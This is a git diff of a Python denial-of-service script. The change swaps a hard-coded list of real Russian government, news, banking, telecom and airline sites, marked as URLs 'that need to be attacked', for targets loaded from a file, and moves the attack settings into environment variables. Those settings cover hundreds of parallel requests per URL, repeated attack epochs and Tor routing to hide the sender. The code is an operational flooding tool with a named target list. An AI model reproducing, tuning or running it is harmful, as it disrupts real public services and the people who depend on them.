@@ -4,6 +4,7 @@ from typing import Dict, Any, List, Tuple
 import requests
 import random
 import sys
+import os
 import concurrent.futures
 from itertools import repeat
 from string import ascii_lowercase, ascii_uppercase
@@ -48,121 +49,27 @@ TOR_CHANGE_IP_LOCK = threading.Lock()
 
 # Change configuration here
 #-----------------------------------------------------------------------------------------------------------------------
-# A list of urls that need to be attacked
-# Please note that all of them are either "http" or "https"
-LIST_OF_URLS = [
-    # "http://www.rt.com",
-    # "https://russian.rt.com/",
-    # "http://www.cbr.ru",
-    # "http://rbc.ru",
-    # "http://www.kremlin.ru",
-    # "http://www.vesti.ru",
-    # "https://vsoloviev.ru/",
-    # "https://tass.ru/",
-    # "https://tvzvezda.ru/",
-    # "http://www.smotrim.ru",
-    # "http://www.vgtrk.ru",
-    # "https://www.kommersant.ru",
-    # "https://www.kp.ru/",
-    # "https://rg.ru/",
-    # "http://194.190.37.226:80",
-    # "https://cdnimg.rg.ru/img/content/227/24/50/2p_gorlovka-podval(1)_t_310x206.jpg",
-    # "https://outercdn.rg.ru/covid-19/result.json?rel=25-02-2022-20&callbackCovid=callbackCovid",
-    # "https://front.rg.ru/api/currency/result.json?callback=callback&_=1645822786176",
-    # "http://lenta.ru",
-    # "https://ria.ru/lenta/",
-    # "http://gosuslugi.ru",
-    # "https://yandex.ru/",
-    # "https://tv.yandex.ru/?utm_source=main_stripe_big",
-    # "https://tv.yandex.ru/api/sk",
-    # "https://music.yandex.ru/?utm_source=main_stripe_big",
-    # "https://auto.ru/?utm_source=main_stripe_big",
-    # "https://yandex.ru/news/?utm_source=main_stripe_big",
-    # "https://strm.yandex.ru/probe/jobs?count=5&size=51200",
-    # "https://akamai.strm.yandex.net/probe/test_file_51200.mp4?size=51200&rnd=3843909514455359",
-    # "https://www.1tv.ru",
-    # "https://zakupki.gov.ru/",
-    # "http://www.interfax.ru/",
-    # "https://www.interfax.ru/news/2021/06/09",
-    # "https://www.interfax.ru/moscow/771446",
-    # "https://tourism.interfax.ru/",
-    # "https://realty.interfax.ru/",
-    # "https://www.interfax-russia.ru/",
-    # "https://academia.interfax.ru/",
-    # "http://www.interfax-religion.ru/",
-    # "http://178.248.233.231:80",
-    # "https://www.interfax.ru/ftproot/textphotos/2022/02/23/usa_700.jpg",
-    # "http://admin.gazprombank.ru",
-    # "https://www.gazprombank.ru/",
-    # "https://www.gazprombank.ru/atms",
-    # "https://www.gazprombank.ru/offices/21454",
-    # "https://www.gazprombank.ru/atms/6169985",
-    # "http://rkn.gov.ru",
-    # "https://www.mchs.gov.ru/",
-    # "http://95.173.145.58:80",
-    # "https://epp.genproc.gov.ru",
-    # "https://ach.gov.ru",
-    # "https://www.scrf.gov.ru",
-    # "https://mil.ru",
-    # "https://www.aeroflot.com",
-    # "https://www.aeroflot.ru",
-    # "https://www.aeroflot.ru/xx-en/special_offers",
-    # "https://www.aeroflot.ru/xx-en/destination_offers",
-    # "https://www.aeroflot.ru/xx-en/afl_bonus",
-    # "https://www.aeroflot.ru/sb/subsidized/app/ru-ru#/search?_k=a6fp8b"
-    # "https://www.aeroflot.ru/personal/cargo_tracking?_preferredLanguage=en",
-    # "https://www.aeroflot.ru/ru-ru/news/62263?from=new_main",
-    # "https://www.aeroflot.ru/sb/app/xx-en#/search?extended=false&adults=5&children=0&infants=0&award=N&cabin=econom&autosearch=Y&use_voucher=N&routes=MOW.20220317.LED-LED.20220422.MOW&_k=2ns9j8",
-    # "https://login.mts.ru/",
-    # "https://mts.ru/",
-    # "https://moskva.mts.ru/personal",
-    # "https://spb.mts.ru/personal",
-    # "https://lk.spb.mts.ru/api.php?r=site/login",
-    # "https://spb.mts.ru/business/mobilnaya-svyaz/korporativnie-tarifi-i-opcii/umnij_business_m",
-    # "https://spb.mts.ru/business/svyaz/specialnie-predlozheniya/rekomenduem/biznes-abonement",
-    # "https://www.mtsbank.ru/chastnim-licam/karti/credit-mts-cashback/?utm_source=mtsru&utm_medium=partner&utm_campaign=menu_finuslugi&utm_content=cc_cashback",
-    # "https://shop.mts.ru/catalog/smartfony/xiaomi/?utm_source=mts_ru&utm_medium=ref&utm_campaign=inhouse_shop&utm_content=header&utm_term=smartfony_xiaomi&utm_referrer=https%3A%2F%2Fspb.mts.ru%2Fpersonal",
-    # "http://212.193.147.0",
-    # "http://vsrf.ru",
-    # "http://95.173.156.120:80",
-    # "https://maxima-logistic.ru/",
-    # "https://maxima-logistic.ru/company/news/company/6291/",
-    # "https://maxima-logistic.ru/personal/auth/",
-    # "https://mail.rkn.gov.ru/",
-    # "https://cloud.rkn.gov.ru/",
-    # "https://mvd.gov.ru/",
-    # "https://pwd.wto.economy.gov.ru/",
-    # "https://stroi.gov.ru/",
-    # "https://proverki.gov.ru/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-    "https://tekleo.net/",
-]
+# Load targets
+LIST_OF_URLS = []
+with open('targets.txt') as f:
+    lines = f.readlines()
+    lines = [l.strip() for l in lines]
+    lines = [l for l in lines if len(l) > 0]
+    LIST_OF_URLS.extend(lines)
 
-# How many cycles (epochs) of attacks should be performed
-# This value can be ignored, you can control the attack by stopping docker-compose at any time
-NUMBER_OF_EPOCHS = 20
-
-# How many URLs from your list will be attacked in parallel
-PARALLEL_LIST_OF_URLS_WORKERS = 2
-
-# Min/max values that determine how many requests can be simultaneously sent to a single URL
-PARALLEL_SINGLE_URL_MIN_REQUESTS = 400
-PARALLEL_SINGLE_URL_MAX_REQUESTS = 600
-
-# How many requests on the same URL will be processed in parallel
-PARALLEL_SINGLE_URL_WORKERS = 50
-
-# Should we use tor?
-# The default values is True, and we will print out warnings if you disable it
-# Use at your own risk, only if you know what you're doing
-ENABLE_TOR = True
+# Load configuration
+NUMBER_OF_EPOCHS = int(os.environ['NUMBER_OF_EPOCHS'])
+PARALLEL_LIST_OF_URLS_WORKERS = int(os.environ['PARALLEL_LIST_OF_URLS_WORKERS'])
+PARALLEL_SINGLE_URL_MIN_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MIN_REQUESTS'])
+PARALLEL_SINGLE_URL_MAX_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MAX_REQUESTS'])
+PARALLEL_SINGLE_URL_WORKERS = int(os.environ['PARALLEL_SINGLE_URL_WORKERS'])
+ENABLE_TOR = bool(int(os.environ['ENABLE_TOR']))
+print('Environment variable NUMBER_OF_EPOCHS =', NUMBER_OF_EPOCHS)
+print('Environment variable PARALLEL_LIST_OF_URLS_WORKERS =', PARALLEL_LIST_OF_URLS_WORKERS)
+print('Environment variable PARALLEL_SINGLE_URL_MIN_REQUESTS =', PARALLEL_SINGLE_URL_MIN_REQUESTS)
+print('Environment variable PARALLEL_SINGLE_URL_MAX_REQUESTS =', PARALLEL_SINGLE_URL_MAX_REQUESTS)
+print('Environment variable PARALLEL_SINGLE_URL_WORKERS =', PARALLEL_SINGLE_URL_WORKERS)
+print('Environment variable ENABLE_TOR =', ENABLE_TOR)
 #-----------------------------------------------------------------------------------------------------------------------
 
 
@@ -428,7 +335,7 @@ for epoch in range(0, NUMBER_OF_EPOCHS):
     check_my_ip_with_tor()
 
     # Build URLs
-    list_of_http_methods_and_urls = [("GET", url) for url in LIST_OF_URLS]
+    list_of_http_methods_and_urls = [(HTTP_METHOD_GET, url) for url in LIST_OF_URLS]
     random.shuffle(list_of_http_methods_and_urls)
 
     # Run attack
